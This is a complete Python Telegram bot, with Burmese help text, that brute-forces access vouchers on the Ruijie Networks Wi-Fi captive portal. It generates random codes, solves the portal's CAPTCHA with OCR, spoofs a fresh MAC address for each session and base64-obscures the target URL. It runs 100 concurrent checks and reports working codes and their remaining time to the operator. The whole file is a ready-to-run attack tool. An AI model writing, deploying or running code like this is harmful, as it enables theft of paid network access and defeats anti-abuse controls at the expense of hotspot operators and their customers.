#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Voucher Bot - Polling Mode (No Webhook Needed)
Only requires: BOT_TOKEN, ADMIN_ID
Optional: PORT (default 8080)
"""

import os, sys, json, base64, random, re, string, time, uuid, logging
import asyncio, aiohttp
from aiohttp import web
from urllib.parse import urlparse
import ipaddress

from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# OCR optional
OCR_AVAILABLE = False
try:
    import cv2, ddddocr, numpy as np
    OCR_AVAILABLE = True
except ImportError:
    pass

# ── Logging ───────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)-8s | %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("bot")

# ── Environment ───────────────────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN", "").strip()
ADMIN_ID  = os.environ.get("ADMIN_ID", "").strip()
PORT      = int(os.environ.get("PORT", "8080"))

if not BOT_TOKEN or not ADMIN_ID:
    logger.error("FATAL: BOT_TOKEN and ADMIN_ID required!")
    sys.exit(1)

logger.info(f"Config | Admin: {ADMIN_ID} | Port: {PORT}")

# ── Globals ───────────────────────────────────────────────────────────────
bot = AsyncTeleBot(BOT_TOKEN)

user_data        = {}
scan_tasks       = {}
success_texts    = {}
limited_texts    = {}
notify_setting   = {}
last_scan_params = {}
pending_brute    = {}
success_messages = {}
limited_messages = {}

session      = None
_connector   = None
_voucher_sem = None
CONCURRENCY  = 100
_shutting_down = False

BRUTE_MODES = {
    "1": {"name": "ဂဏန်းသီးသန့် (0-9)",         "charset": string.digits},
    "2": {"name": "အင်္ဂလိပ်စာလုံးအသေး (a-z)",    "charset": string.ascii_lowercase},
    "3": {"name": "အင်္ဂလိပ်စာလုံးအကြီး (A-Z)",   "charset": string.ascii_uppercase},
    "4": {"name": "စာလုံးအကြီး+အသေး (a-zA-Z)",    "charset": string.ascii_letters},
    "5": {"name": "စာလုံး+ဂဏန်း (a-z, 0-9)",     "charset": string.ascii_lowercase + string.digits},
}

POST_URL = base64.b64decode(
    b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
).decode()

# ── Helpers ───────────────────────────────────────────────────────────────
def is_admin(cid): 
    return str(cid) == str(ADMIN_ID)

def _parse_minutes(val):
    total = int(val)
    if total <= 0: return "0m"
    if total < 60: return f"{total}m"
    h = total // 60; m = total % 60
    if h < 24: return f"{h}h {m}m" if m else f"{h}h"
    d = h // 24; rh = h % 24
    if d < 30: return f"{d}d {rh}h" if rh else f"{d}d"
    mo = d // 30; rd = d % 30
    return f"{mo}mo {rd}d" if rd else f"{mo}mo"

def iter_codes(mode, length):
    charset = BRUTE_MODES[str(mode)]["charset"]
    while True:
        yield "".join(random.choice(charset) for _ in range(length))

def format_progress(checked, speed=0, found=0, target=None, mode=None, length=None):
    mode_name = BRUTE_MODES.get(str(mode), {}).get("name", "") if mode else ""
    lines = ["📋 Running"]
    if mode_name: lines.append(f"🎯 {mode_name}")
    if length: lines.append(f"📏 {length}")
    lines += [f"⚡ {speed:,.0f}/min", f"🔍 {checked:,}", f"💎 {found}"]
    if target: lines.append(f"🏆 {found}/{target}")
    return "\n".join(lines)

def is_safe_url(url):
    try:
        parsed = urlparse(url)
        if parsed.scheme not in ("http", "https"): return False
        host = parsed.hostname or ""
        if not host or host.lower() in ("localhost", "0.0.0.0"): return False
        try:
            addr = ipaddress.ip_address(host)
            if addr.is_loopback or addr.is_private or addr.is_link_local or addr.is_reserved or addr.is_unspecified:
                return False
        except ValueError:
            pass
        return True
    except Exception:
        return False

# ── OCR ───────────────────────────────────────────────────────────────────
_ocr = None
def get_ocr():
    global _ocr
    if _ocr is None and OCR_AVAILABLE:
        try: 
            _ocr = ddddocr.DdddOcr(show_ad=False)
            logger.info("OCR loaded")
        except Exception as e: 
            logger.warning(f"OCR failed: {e}")
    return _ocr

def _ocr_sync(image_bytes):
    ocr_engine = get_ocr()
    if ocr_engine is None: 
        return None
    try:
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        if img is None: 
            return None
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        blur = cv2.GaussianBlur(gray, (3, 3), 0)
        _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        _, buf = cv2.imencode('.png', thresh)
        return ocr_engine.classification(buf.tobytes()).upper()
    except Exception as e:
        logger.debug(f"OCR error: {e}")
        return None

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

def get_mac():
    first = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first] + [random.randint(0x00, 0xFF) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(session_obj, session_url, prev=None):
    url = replace_mac(session_url, get_mac())
    headers = {
        'accept': 'text/html,application/xhtml+xml,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    try:
        async with session_obj.get(url, headers=headers, allow_redirects=True,
                                   timeout=aiohttp.ClientTimeout(total=15)) as req:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return sid.group(1) if sid else prev
    except Exception as e:
        logger.debug(f"get_session_id: {e}")
        return prev

async def Captcha_Image(session_obj, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/*,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session_obj.get(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
        params=params, headers=headers, timeout=aiohttp.ClientTimeout(total=10)
    ) as req:
        return await req.read()

async def Varify_Captcha(session_obj, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    }
    async with session_obj.post(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
        headers=headers, json={'sessionId': session_id, 'authCode': text},
        timeout=aiohttp.ClientTimeout(total=10)
    ) as req:
        data = await req.json(content_type=None)
        return session_id if data.get("success") == True else None

async def check_session_url(session_url):
    if not is_safe_url(session_url): 
        return False
    headers = {
        'accept': 'text/html,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    try:
        async with session.get(session_url, allow_redirects=False, headers=headers,
                                timeout=aiohttp.ClientTimeout(total=15)) as first:
            location = first.headers.get("Location", "")
            if location and is_safe_url(location):
                async with session.get(location, allow_redirects=False, headers=headers,
                                        timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    return "sessionId" in str(resp.url) or "sessionId" in location
            return "sessionId" in str(first.url) or "sessionId" in location
    except Exception as e:
        logger.error(f"check_session_url: {e}")
        return False

async def get_balance(token):
    urls = [
        f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{token}",
        f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{token}",
    ]
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    for url in urls:
        try:
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status != 200: 
                    continue
                data = await resp.json(content_type=None)
                candidates = [data]
                for k in ['result', 'data']:
                    if isinstance(data, dict) and isinstance(data.get(k), dict):
                        candidates.append(data[k])
                for d in candidates:
                    if not isinstance(d, dict): 
                        continue
                    for key in ['totalMinutes', 'remainingMinutes', 'remainMinutes', 'leftMinutes', 'balance', 'remaining']:
                        if d.get(key) is not None:
                            return _parse_minutes(d[key])
                    for key in ['remainingSeconds', 'remainTime', 'remainingTime', 'leftTime', 'timeLeft']:
                        if d.get(key) is not None:
                            return _parse_seconds(d[key])
        except Exception:
            pass
    return "N/A"

# ── Core voucher check ────────────────────────────────────────────────────
async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    if not recheck:
        ct = scan_tasks.get(chat_id)
        if not ct or ct.get("scan_id") != scan_id:
            return None

    response = None
    session_id = None

    for attempt in range(3):
        try:
            ts = aiohttp.ClientSession(
                connector=_connector, connector_owner=False,
                cookie_jar=aiohttp.CookieJar(),
                timeout=aiohttp.ClientTimeout(total=30)
            )
            async with ts:
                session_id = await get_session_id(ts, session_url)
                if not session_id:
                    continue

                auth_code = None
                for _ in range(8):
                    try:
                        img = await Captcha_Image(ts, session_id)
                        text = await Captcha_Text(img)
                        if text and await Varify_Captcha(ts, session_id, text):
                            auth_code = text
                            break
                    except Exception:
                        continue
                if not auth_code:
                    continue

                if not recheck:
                    ct = scan_tasks.get(chat_id)
                    if not ct or ct.get("scan_id") != scan_id or ct.get("stop"):
                        return None

                data = {
                    "accessCode": code, "sessionId": session_id,
                    "apiVersion": 1, "authCode": auth_code
                }
                headers = {
                    "authority": "portal-as.ruijienetworks.com",
                    "accept": "*/*",
                    "accept-language": "en-US,en;q=0.9",
                    "content-type": "application/json",
                    "origin": "https://portal-as.ruijienetworks.com",
                    "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}",
                    "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                }
                try:
                    async with ts.post(POST_URL, json=data, headers=headers) as req:
                        response = await req.text()
                        logger.info(f"[voucher] code={code} status={req.status}")
                except Exception:
                    return None

            if response and 'request limited' in response:
                await asyncio.sleep(2)
                continue
            break
        except Exception as e:
            logger.debug(f"perform_check attempt {attempt+1}: {e}")
            break

    if not response:
        return None

    if 'logonUrl' in response:
        if recheck:
            return code

        plan_str = "N/A"
        try:
            res_data = json.loads(response)
            logon_url = res_data.get("result", {}).get("logonUrl", "") if isinstance(res_data, dict) else ""
            tm = re.search(r'token=(.*?)&', logon_url)
            token = tm.group(1) if tm else session_id
            fetched = await get_balance(token)
            if fetched not in ("N/A", "Error"):
                plan_str = fetched
        except Exception:
            pass

        if chat_id not in success_texts:
            success_texts[chat_id] = []
        success_texts[chat_id].append({"code": code, "session_id": session_id, "plan": plan_str})

        if notify_setting.get(chat_id, True):
            code_line = "\n".join([f"`{i['code']}` – {i['plan']}" for i in success_texts[chat_id]])
            try:
                if chat_id not in success_messages:
                    sent = await bot.send_message(chat_id, f"✅ Success:\n{code_line}", parse_mode="Markdown")
                    success_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(
                        chat_id=chat_id, message_id=success_messages[chat_id],
                        text=f"✅ Success:\n{code_line}", parse_mode="Markdown"
                    )
            except Exception:
                pass
        return code

    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        limited_texts[chat_id].append(code)
        if notify_setting.get(chat_id, True):
            limited_line = "\n".join(limited_texts[chat_id])
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(chat_id, f"⚠️ Limited:\n{limited_line}")
                    limited_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(
                        chat_id=chat_id, message_id=limited_messages[chat_id],
                        text=f"⚠️ Limited:\n{limited_line}"
                    )
            except Exception:
                pass

    return None

# ── Brute-force runner ────────────────────────────────────────────────────
async def run_bruteforce(mode, length, chat_id, session_url, scan_id,
                          target=None, message=None, progress_msg=None):
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    checked = 0
    found = 0
    scan_start = time.monotonic()
    code_iter = iter_codes(mode, length)

    try:
        while not _shutting_down:
            ct = scan_tasks.get(chat_id)
            if not ct or ct.get("scan_id") != scan_id:
                return
            if ct.get("stop"):
                last_scan_params[chat_id] = {"mode": mode, "length": length, "target": target}
                scan_tasks.pop(chat_id, None)
                return

            batch = [next(code_iter) for _ in range(300)]

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code, chat_id, scan_id, message=message)

            results = await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)

            for res in results:
                if isinstance(res, Exception):
                    continue
                if res:
                    found += 1
                    if target and found >= target:
                        try:
                            await bot.edit_message_text(
                                chat_id=chat_id, message_id=progress_msg.message_id,
                                text=f"🎯 Target {target} reached!"
                            )
                        except Exception:
                            pass
                        scan_tasks.pop(chat_id, None)
                        last_scan_params.pop(chat_id, None)
                        return

            checked += len(batch)
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            text = format_progress(checked, speed, found, target, mode, length)
            try:
                await bot.edit_message_text(
                    chat_id=chat_id, message_id=progress_msg.message_id, text=text
                )
            except Exception:
                try:
                    nm = await bot.send_message(chat_id, text)
                    progress_msg.message_id = nm.message_id
                except Exception:
                    pass

    except asyncio.CancelledError:
        last_scan_params[chat_id] = {"mode": mode, "length": length, "target": target}
        raise
    finally:
        scan_tasks.pop(chat_id, None)

# ── Bot Handlers ──────────────────────────────────────────────────────────
@bot.message_handler(commands=['start'])
async def cmd_start(message):
    await bot.reply_to(message,
        "🤖 Voucher Bot\n/help ဖြင့် အသုံးပြုနည်းကြည့်ပါ။"
    )

@bot.message_handler(commands=['help'])
async def cmd_help(message):
    await bot.reply_to(message,
        "📖 အသုံးပြုနည်း\n\n"
        "၁။ /setup <url>\n"
        "၂။ /brute <mode> <length> [target]\n"
        "   1=ဂဏန်း 2=အသေး 3=အကြီး 4=စာလုံး 5=စာ+ဂဏန်း\n"
        "၃။ /status  ၄။ /stop  ၅။ /resume\n"
        "၆။ /saved  ၇။ /delete_saved  ၈။ /recheck  ၉။ /notify"
    )

@bot.message_handler(commands=['setup'])
async def cmd_setup(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "❌ No Permission")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n/setup <session_url>")
        return
    url = args[1].strip()
    chat_id = message.chat.id
    await bot.reply_to(message, "⏳ Checking URL...")
    if await check_session_url(url):
        user_data[chat_id] = {'session_url': url}
        success_texts.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        last_scan_params.pop(chat_id, None)
        pending_brute.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        await bot.reply_to(message, "✅ URL saved! Use /brute")
    else:
        await bot.reply_to(message, "❌ Invalid URL.")

@bot.message_handler(commands=['brute'])
async def cmd_brute(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "❌ No Permission")
        return
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message, "Usage:\n/brute <mode> <length> [target]\nEx: /brute 1 6 5")
        return

    mode_str = args[1]
    if mode_str not in BRUTE_MODES:
        await bot.reply_to(message, "❌ Mode 1-5 only.")
        return
    try:
        length = int(args[2])
        if not 1 <= length <= 20:
            raise ValueError
    except ValueError:
        await bot.reply_to(message, "❌ Length must be 1-20.")
        return
    target = None
    if len(args) >= 4:
        try:
            target = int(args[3])
        except ValueError:
            await bot.reply_to(message, "❌ Target must be number.")
            return

    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "❌ /setup first.")
        return
    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "⚠️ Already running. /stop first.")
        return

    if chat_id in last_scan_params:
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("▶️ Resume", callback_data="resume_scan"),
            InlineKeyboardButton("🆕 New", callback_data="new_scan")
        )
        pending_brute[chat_id] = {"mode": mode_str, "length": length, "target": target}
        prev = last_scan_params[chat_id]
        await bot.reply_to(message,
            f"Previous scan paused.\nMode:{prev['mode']} Len:{prev['length']}",
            reply_markup=markup)
        return

    await start_brute_scan(chat_id, mode_str, length, target, message)

async def start_brute_scan(chat_id, mode, length, target, original_message):
    mode_name = BRUTE_MODES[str(mode)]["name"]
    target_note = f" | Target: {target}" if target else ""
    progress_msg = await bot.send_message(
        chat_id,
        f"🔍 Starting\n🎯 {mode_name}\n📏 {length}{target_note}"
    )
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(int(mode), length, chat_id,
                       user_data[chat_id]['session_url'],
                       scan_id, target,
                       message=original_message,
                       progress_msg=progress_msg)
    )
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
    success_messages.pop(chat_id, None)
    limited_messages.pop(chat_id, None)

@bot.callback_query_handler(func=lambda call: call.data in ["resume_scan", "new_scan"])
async def handle_resume_callback(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)
    if call.data == "resume_scan":
        if chat_id not in last_scan_params:
            await bot.edit_message_text("No scan to resume.", chat_id=chat_id, message_id=call.message.message_id)
            return
        params = last_scan_params.pop(chat_id)
        await bot.edit_message_text("▶️ Resuming...", chat_id=chat_id, message_id=call.message.message_id)
        await start_brute_scan(chat_id, params['mode'], params['length'], params['target'], call.message)
    else:
        params = pending_brute.pop(chat_id, None)
        last_scan_params.pop(chat_id, None)
        if params:
            await bot.edit_message_text("🆕 New scan...", chat_id=chat_id, message_id=call.message.message_id)
            await start_brute_scan(chat_id, params['mode'], params['length'], params['target'], call.message)
        else:
            await bot.edit_message_text("Send /brute again.", chat_id=chat_id, message_id=call.message.message_id)

@bot.message_handler(commands=['stop'])
async def cmd_stop(message):
    if not is_admin(message.chat.id): 
        return
    data = scan_tasks.get(message.chat.id)
    if data:
        data["stop"] = True
        if not data["task"].done():
            data["task"].cancel()
        await bot.reply_to(message, "⏹️ Stopped. /resume to continue.")
    else:
        await bot.reply_to(message, "⚠️ No scan running.")

@bot.message_handler(commands=['resume'])
async def cmd_resume(message):
    if not is_admin(message.chat.id): 
        return
    chat_id = message.chat.id
    if chat_id not in last_scan_params:
        await bot.reply_to(message, "⚠️ No paused scan.")
        return
    params = last_scan_params.pop(chat_id)
    await start_brute_scan(chat_id, params['mode'], params['length'], params['target'], message)
    await bot.reply_to(message, "▶️ Resumed.")

@bot.message_handler(commands=['status'])
async def cmd_status(message):
    if not is_admin(message.chat.id): 
        return
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    found = len(success_texts.get(chat_id, []))
    if not data or data["task"].done():
        await bot.reply_to(message, f"⚠️ Idle\n💎 Found: {found}")
        return
    uptime = int(time.monotonic() - _start_time)
    h, r = divmod(uptime, 3600); m, s = divmod(r, 60)
    await bot.reply_to(message, f"📋 Running\n💎 {found}\n⏱ {h}h {m}m {s}s")

@bot.message_handler(commands=['saved'])
async def cmd_saved(message):
    if not is_admin(message.chat.id): 
        return
    chat_id = message.chat.id
    success = success_texts.get(chat_id, [])
    limited = limited_texts.get(chat_id, [])
    if not success and not limited:
        await bot.reply_to(message, "⚠️ Empty.")
        return
    parts = []
    if success:
        parts.append(f"✅ Success ({len(success)})")
        for item in success:
            parts.append(f"`{item['code']}` – {item.get('plan', 'N/A')}")
    if limited:
        parts.append(f"\n⚠️ Limited ({len(limited)})")
        parts.extend(limited)
    full_text = "\n".join(parts)
    for i in range(0, len(full_text), 4096):
        await bot.send_message(chat_id, full_text[i:i+4096], parse_mode="Markdown")

@bot.message_handler(commands=['delete_saved'])
async def cmd_delete_saved(message):
    if not is_admin(message.chat.id): 
        return
    chat_id = message.chat.id
    count = len(success_texts.get(chat_id, [])) + len(limited_texts.get(chat_id, []))
    success_texts.pop(chat_id, None)
    limited_texts.pop(chat_id, None)
    success_messages.pop(chat_id, None)
    limited_messages.pop(chat_id, None)
    await bot.reply_to(message, f"✅ Deleted {count} codes.")

@bot.message_handler(commands=['notify'])
async def cmd_notify(message):
    if not is_admin(message.chat.id): 
        return
    chat_id = message.chat.id
    notify_setting[chat_id] = not notify_setting.get(chat_id, True)
    await bot.reply_to(message, f"📢 {'ON ✅' if notify_setting[chat_id] else 'OFF ❌'}")

@bot.message_handler(commands=['recheck'])
async def cmd_recheck(message):
    if not is_admin(message.chat.id): 
        return
    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "❌ /setup first.")
        return
    success = success_texts.get(chat_id, [])
    if not success:
        await bot.reply_to(message, "⚠️ No success codes.")
        return
    await bot.reply_to(message, "⏳ Rechecking...")
    new_success = []
    for item in success:
        recode = await perform_check(user_data[chat_id]['session_url'], item["code"], chat_id, recheck=True)
        if recode:
            new_success.append(item)
    success_texts[chat_id] = new_success
    await bot.reply_to(message,
        f"✅ {len(new_success)} remain." if new_success else "✅ None remain."
    )

# ── Health Check Server (Railway needs this) ─────────────────────────────
async def handle_health(request):
    return web.json_response({
        "status": "ok",
        "mode": "polling",
        "active_scans": len([t for t in scan_tasks.values() if not t["task"].done()])
    })

async def handle_root(request):
    return web.Response(text="Voucher Bot is running in polling mode!")

async def start_health_server():
    app = web.Application()
    app.router.add_get('/', handle_root)
    app.router.add_get('/health', handle_health)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    logger.info(f"🚀 Health server: 0.0.0.0:{PORT}")

# ── Polling Loop ──────────────────────────────────────────────────────────
async def polling_loop():
    """Keep polling Telegram with auto-reconnect"""
    while not _shutting_down:
        try:
            logger.info("📡 Starting Telegram polling...")
            # non_stop=True keeps running even on errors
            await bot.polling(
                non_stop=True, 
                timeout=30, 
                request_timeout=30,
                allowed_updates=["message", "callback_query"],
                skip_pending=True
            )
        except Exception as e:
            logger.error(f"Polling crashed: {e}")
            if not _shutting_down:
                logger.info("Reconnecting in 5s...")
                await asyncio.sleep(5)

# ── Main ──────────────────────────────────────────────────────────────────
async def main():
    global session, _connector, _voucher_sem, _start_time

    _connector = aiohttp.TCPConnector(
        limit=200, limit_per_host=50, ttl_dns_cache=300,
        enable_cleanup_closed=True, force_close=True,
    )
    session = aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=30),
        connector=_connector, connector_owner=False,
    )
    _voucher_sem = asyncio.Semaphore(CONCURRENCY)
    _start_time = time.monotonic()

    # Start health check server (Railway requirement)
    await start_health_server()

    # Verify bot token works
    try:
        me = await bot.get_me()
        logger.info(f"✅ Bot connected: @{me.username}")
        await bot.send_message(ADMIN_ID, f"🤖 Bot @{me.username} is online!\nSend /help to begin.")
    except Exception as e:
        logger.error(f"❌ Cannot connect to Telegram: {e}")
        logger.error("Check BOT_TOKEN is correct and bot is not blocked.")
        return

    # Run polling (this blocks until error, then reconnects)
    await polling_loop()

    # Cleanup
    if session and not session.closed:
        await session.close()
    if _connector and not _connector.closed:
        await _connector.close()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        _shutting_down = True
        logger.info("Stopped by user")
